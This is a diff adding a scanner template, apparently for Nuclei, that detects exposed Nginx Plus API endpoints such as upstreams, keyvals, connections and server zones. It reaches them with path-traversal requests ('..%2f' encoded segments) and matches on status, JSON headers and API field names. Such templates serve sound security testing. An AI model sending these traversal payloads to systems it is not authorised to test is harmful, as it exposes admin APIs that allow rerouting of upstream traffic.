@@ -1,0 +1,80 @@
+id: nginx-upstream-routes
+
+info:
+  name: Detect Nginx Upstream Routes
+  author: reewardius
+  reference: https://zoidsec.medium.com/breaking-parse-logic-gain-access-to-nginx-api-read-write-upstreams-1cb062aa44ca
+  severity: high
+  tags: nginx
+  
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
+      - '{{BaseURL}}/..%2f/api/7/'
+      - '{{BaseURL}}/..%2f/api/7/connections'
+      - '{{BaseURL}}/..%2f/api/7/http/caches/cache_backend'
+      - '{{BaseURL}}/..%2f/api/7/http/keyvals/one?key=arg1'
+      - '{{BaseURL}}/..%2f/api/7/http/requests'
+      - '{{BaseURL}}/..%2f/api/7/http/server_zones/server_backend'
+      - '{{BaseURL}}/..%2f/api/7/http/upstreams/backend'
+      - '{{BaseURL}}/..%2f/api/7/http/upstreams/backend/servers/'
+      - '{{BaseURL}}/..%2f/api/7/http/upstreams/backend/servers/1'
+      - '{{BaseURL}}/..%2f/api/7/nginx'
+      - '{{BaseURL}}/..%2f/api/7/stream/'
+      - '{{BaseURL}}/..%2f/api/7/stream/server_zones/server_backend'
+      - '{{BaseURL}}/..%2f/api/7/stream/upstreams/'
+      - '{{BaseURL}}/..%2f/api/7/stream/upstreams/backend'
+      - '{{BaseURL}}/..%2f/api/7/stream/upstreams/backend/servers/1'
+      - '{{BaseURL}}/..%2f/api/7/stream/upstreams/backend/servers/2'
+      - '{{BaseURL}}/..%2f/api/7/stream/upstreams/backend/servers/3'
+      - '{{BaseURL}}/..%2f/api/8/'
+      - '{{BaseURL}}/..%2f/api/8/connections'
+      - '{{BaseURL}}/..%2f/api/8/http/caches/cache_backend'
+      - '{{BaseURL}}/..%2f/api/8/http/keyvals/one?key=arg1'
+      - '{{BaseURL}}/..%2f/api/8/http/requests'
+      - '{{BaseURL}}/..%2f/api/8/http/server_zones/server_backend'
+      - '{{BaseURL}}/..%2f/api/8/http/upstreams/backend'
+      - '{{BaseURL}}/..%2f/api/8/http/upstreams/backend/servers/'
+      - '{{BaseURL}}/..%2f/api/8/http/upstreams/backend/servers/1'
+      - '{{BaseURL}}/..%2f/api/8/nginx'
+      - '{{BaseURL}}/..%2f/api/8/stream/'
+      - '{{BaseURL}}/..%2f/api/8/stream/server_zones/server_backend'
+      - '{{BaseURL}}/..%2f/api/8/stream/upstreams/'
+      - '{{BaseURL}}/..%2f/api/8/stream/upstreams/backend'
+      - '{{BaseURL}}/..%2f/api/8/stream/upstreams/backend/servers/1'
+      - '{{BaseURL}}/..%2f/api/8/stream/upstreams/backend/servers/2'
+      - '{{BaseURL}}/..%2f/api/8/stream/upstreams/backend/servers/3'
+      
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        words:
+          - 'server'
+          - 'weight'
+          - 'peer_rejected_cert'
+          - 'hostname_mismatch'
+          - 'state'
+          - 'backup'
+          - 'health_check'
+          - 'server_zone'
+          - 'processing'
+          - 'revalidated'
+          - 'peers'
+          - 'handshakes_failed'
+          - 'response_time'
+          - 'health_checks'
+          - 'no_common_protocol'
+          - 'fail_timeout'
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - "application/json"
